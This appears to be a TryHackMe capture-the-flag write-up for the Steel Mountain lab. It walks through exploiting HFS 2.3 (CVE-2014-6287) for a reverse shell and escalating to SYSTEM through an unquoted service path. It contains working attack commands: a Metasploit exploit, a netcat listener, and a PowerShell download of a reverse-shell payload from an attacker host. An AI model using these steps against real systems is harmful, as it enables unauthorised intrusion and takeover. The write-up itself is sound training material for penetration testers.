---
title: THM - Steel Mountain
date: 2022-07-23 22:09:00 +0200
categories: [Writeups]
tags: [tryhackme, tutorial]     # TAG names should always be lowercase
---


## Introduction
Steel Mountain refers to the data security firm where the protagonist Eliot broke into in the TV show Mr. Robot.
Opening a browser to this machine shows a simple html website showing a picture of the employee of the month.
Looking at the source code of the web page we get the answer to the first question: `<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>`


## Initial access
Running nmap TCP SYN scan shows that are a few more ports open:
```shell
$ sudo nmap -sS -T4 -Pn -p1-10000 <TARGET_IP>`
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 14:46 EDT
Nmap scan report for <TARGET_IP>
Host is up (0.025s latency).
Not shown: 9993 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8080/tcp open  http-proxy
```
Checking the other website running on TCP port 8080 reveals what seems to be a web app to browse system files.
The bottom left corner contains server information including a hyperlink [HTTP File Server 2.3](http://www.rejetto.com/hfs/) towards the open source project of the web app.

Searching Exploit-DB shows that HFS version 2.3 is vulnerable (CVE-2014-6287) to RCE.
The Metasploit Framework has the exploit included as well in `exploit/windows/http/rejetto_hfs_exec`.
Changing the module options (rhosts, rport, lhost, srvhost) results in a Meterpreter reverse TCP shell.

> Note that it took a few minutes after running the exploit until the Meterpreter Shell Prompt was ready.
{: .prompt-tip }

With the Meterpreter shell running we can start exploring. It seems the server is running Windows 2012 R2 and logged in with the Employee of the Month user as can be seen below.

```
meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: STEELMOUNTAIN\bill
meterpreter > pwd
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
The first flag can be found on Bills' desktop `C:\Users\bill\Desktop>\user.txt`{: .filepath}


## Privilege escalation
Meterpreter has automated privilege escalation options such as using the builtin getsystem command.
However, this challenge explores different options by using the PowerUp.ps1 script provided by PowerShellMafia to find privilege escalation vectors.
After uploading the script to the victim machine it seems one service can be restarted by Bill and has an unquoted service file path as can be seen below:

```
ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
```
The unquoted file path signifies the command is ambiguous, meaning its open to interpretation. The spaces are normally used to separate command arguments unless they are quoted.
The table below shows the order in which the command line will interpret it. Since the Iobit folder is writable by user Bill, we can create our own reverse shell payload and name it `Advanced.exe`.


| Command		| Argument 1 		| Argument 2		    | Argument 3	 	|
|:----------------------|:---------------------:|:-------------------------:|--------------------------:|
| C:\Program.exe	| Files  		| (x86)\Iobit\Advanced      | SystemCare\ASCService.exe
| C:\Program Files.exe  | (x86)\Iobit\Advanced  | SystemCare\ASCService.exe |				|
| C:\Program Files (x86)\Iobit\Advanced.exe | SystemCare\ASCService.exe |	|

Once the payload is written to `C:\Program Files (x86)\Iobit`{: .filepath}, we can start a listener on the attack machine and restart the service:
```console?lang=batchfile
C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
```
We are now logged in as NT Authority/SYSTEM which is allowed to grab the root flag located at: `C:\Users\Administrator\Desktop\root.txt`{: .filepath}

## Access and Escalation without Metasploit
Although Metasploit is incredibly usefull, it is not a good practice to only rely on a single tool. Furthermore, Meterpreter is easily detected by modern AVs \[citation needed\].
The last task explores a more manual approach to hack the target machine. Once the provided exploit is downloaded we need to prepare it by adjusted the variables`ip_addr`, `local_port` with our own values of the attack machine.
As described in the comment section, we need to host a webserver while running the exploit to retrieve the nc.exe binary. 

Terminal window 1:
```shell
──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]
└─$ mv 39161 exploit.py
┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]
└─$ chmod +x Exploit.py  
┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]
└─$ python2 ./Exploit.py <TARGET_IP> 8080     
```

Terminal window 2:
```shell
┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]
└─$ python3 -m http.server 80                                                                                                                                                                            1 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
<TARGET_IP> - - [24/Jul/2022 15:09:16] "GET /nc.exe HTTP/1.1" 200 -
┌──(kali㉿kali)-[~/TryHackMe/offensive-pentesting/steelmountain]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to <ATTACK_IP> from (UNKNOWN) <TARGET_IP>  49305
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

With the shell working we can download and run the WinPeas binary using PowerShell:
`powershell -c Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/download/20220724/winPEASx86.exe -Outfile "privesc.exe"`

With the same web server running on the attack machine we can download the same reverse shell payload:
`powershell -c Invoke-WebRequest -Uri http://<ATTACKER_IP>/Advanced.exe -Outfile "Advanced.exe"`

And repeat the same procedures from the last paragraph to obtain a high privileged shell!